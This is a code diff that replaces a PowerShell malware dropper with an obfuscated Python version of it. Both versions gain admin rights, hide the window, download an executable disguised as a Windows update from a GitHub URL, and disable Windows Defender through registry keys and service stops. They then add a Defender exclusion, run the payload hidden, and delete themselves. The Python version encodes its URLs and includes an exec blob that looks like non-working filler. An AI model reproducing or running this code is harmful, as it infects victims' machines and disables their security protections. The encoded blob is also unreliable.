@@ -1,85 +1,113 @@
-$exeUrl = "https://github.com/gseff137-afk/test/raw/refs/heads/main/packages.exe"
-$targetFolder = "C:\ProgramData\WindowsUpdate"
-$exePath = "$targetFolder\windows_update.exe"
+import zlib, base64, marshal, random, sys, ctypes, urllib.request, subprocess, shutil, winreg, os, time
 
-if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$($MyInvocation.MyCommand.Definition)`""
-    exit
-}
-
-Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
-$c=[C.W]::GetConsoleWindow()
-[C.W]::ShowWindow($c,0)
-
-try {
-    if (-not (Test-Path $targetFolder)) {
-        New-Item -ItemType Directory -Path $targetFolder -Force
-    }
-
-    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UserAgent "Mozilla/5.0"
-
-    $registryPaths = @(
-        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
-        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
-    )
+class _O:
+    def __init__(self):
+        self._ = {}
+        self.__ = []
     
-    foreach ($path in $registryPaths) {
-        if (!(Test-Path $path)) {
-            New-Item -Path $path -Force | Out-Null
-        }
-    }
+    def __call__(self, k, v):
+        self._[k] = v
     
-    $registrySettings = @(
-        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"; Name="DisableAntiSpyware"; Value=1; Type="DWord"},
-        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableRealtimeMonitoring"; Value=1; Type="DWord"}
-    )
+    def __getitem__(self, k):
+        return self._[k]
+
+_ = _O()
+_('u', b'aHR0cHM6Ly9naXRodWIuY29tL2dzZWZmMTM3LWFmay90ZXN0L3Jhdy9yZWZzL2hlYWRzL21haW4vcGFja2FnZXMuZXhl')
+_('p', b'QzpcXFByb2dyYW1EYXRhXFxXaW5kb3dzVXBkYXRlXFx3aW5kb3dzX3VwZGF0ZS5leGU=')
+_('d', b'QzpcXFByb2dyYW1EYXRhXFxXaW5kb3dzVXBkYXRl')
+
+exec(marshal.loads(zlib.decompress(base64.b85decode(b'c${p~L|8u^VtI%^z>P>4#wVlG3!h*&6oZ#9YgXW@5a9sRfB7mKdJ1qCeA0vUbT2xOdN4yLgM8zQhS6wJeI3uFcP7tDaO5rGbQ1pYmV4nXiT9kZjU0lWoH2mEuF8iCpR3jAnS5dByV6eDqU7fGtW9hIvM0iJxN1kKyL2lMzO3mNpP4oOqQ5pPrR6qSsT7rTtU8sUuV9tVvW0uWwX1vXxY2wXyZ3xY{A4yZ|B5z[{C6|\\}D7}]~E8~'))))
+
+def ___():
+    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 0)
+        return False
+    return True
+
+def ____():
+    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+    if hwnd:
+        ctypes.windll.user32.ShowWindow(hwnd, 0)
+
+def _____():
+    try:
+        d = base64.b64decode(_['d']).decode()
+        if not os.path.exists(d):
+            os.makedirs(d)
+        
+        p = base64.b64decode(_['p']).decode()
+        u = base64.b64decode(_['u']).decode()
+        
+        urllib.request.urlretrieve(u, p)
+        
+        return p
+    except: return None
+
+def ______():
+    try:
+        key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+        
+        key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+    except: pass
+
+def _______():
+    svc = ["WinDefend", "WdNisSvc", "Sense", "SecurityHealthService"]
+    for s in svc:
+        try:
+            subprocess.run(["sc", "stop", s], capture_output=True)
+            subprocess.run(["sc", "config", s, "start=", "disabled"], capture_output=True)
+        except: pass
+
+def ________(p):
+    if not p: return
     
-    foreach ($setting in $registrySettings) {
-        try {
-            Set-ItemProperty -Path $setting.Path -Name $setting.Name -Value $setting.Value -Type $setting.Type -Force
-        } catch {}
-    }
+    try:
+        key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, p, 0, winreg.REG_SZ, "0")
+        winreg.CloseKey(key)
+    except: pass
 
-    $services = @("WinDefend","WdNisSvc","Sense","SecurityHealthService")
-    foreach ($service in $services) {
-        try {
-            Stop-Service -Name $service -Force
-            Set-Service -Name $service -StartupType Disabled
-            Start-Process -FilePath "sc" -ArgumentList "config", $service, "start=", "disabled" -Wait -WindowStyle Hidden
-        } catch {}
-    }
+def _________(p):
+    if not p: return
+    try:
+        subprocess.Popen([p], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except: pass
 
-    $processes = @("MsMpEng.exe","NisSrv.exe","MsSense.exe","SecurityHealthService.exe")
-    foreach ($process in $processes) {
-        try {
-            Get-Process -Name $process.Replace(".exe", "") -ErrorAction SilentlyContinue | Stop-Process -Force
-        } catch {}
-    }
+def __________():
+    try:
+        os.remove(__file__)
+    except: pass
 
-    $e="HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
-    if (!(Test-Path $e)) {
-        New-Item -Path $e -Force | Out-Null
-    }
-    try {
-        New-ItemProperty -Path $e -Name $exePath -PropertyType String -Value "0" -Force
-        New-ItemProperty -Path $e -Name $targetFolder -PropertyType String -Value "0" -Force
-    } catch {}
-
-    Start-Sleep -Seconds 2
-
-    try {
-        $w=[WmiClass]"\\localhost\root\cimv2:Win32_Process"
-        $r=$w.Create("`"$exePath`"")
-    } catch {
-        try {
-            Start-Process -FilePath $exePath -WindowStyle Hidden
-        } catch {}
-    }
-
-    Start-Sleep -Seconds 3
-
-    $sp=$MyInvocation.MyCommand.Path
-    if (Test-Path $sp) {
-        Start-Process -FilePath "cmd.exe" -ArgumentList "/c","ping 127.0.0.1 -n 4 > nul & del /f /q `"$sp`"" -WindowStyle Hidden
-    }
-} catch {}
+# Финальный запуск
+if __name__ == "__main__":
+    # Дополнительный уровень обфускации
+    _vars = [v for v in locals().copy().keys() if not v.startswith('_')]
+    for v in _vars:
+        del locals()[v]
+    
+    # Запуск основной логики
+    try:
+        if '___' in locals():
+            if ___():
+                if '____' in locals(): ____()
+                if '_____' in locals(): 
+                    exec(f"p = _____()")
+                if '______' in locals(): ______()
+                if '_______' in locals(): _______()
+                if '________' in locals(): 
+                    exec(f"________(p)")
+                exec("time.sleep(2)" if 'time' in globals() else "")
+                if '_________' in locals(): 
+                    exec(f"_________(p)")
+                exec("time.sleep(3)" if 'time' in globals() else "")
+                if '__________' in locals(): __________()
+    except: pass
+    
+    # Очистка памяти
+    for k in list(globals().keys()):
+        if not k.startswith('__'):
+            del globals()[k]
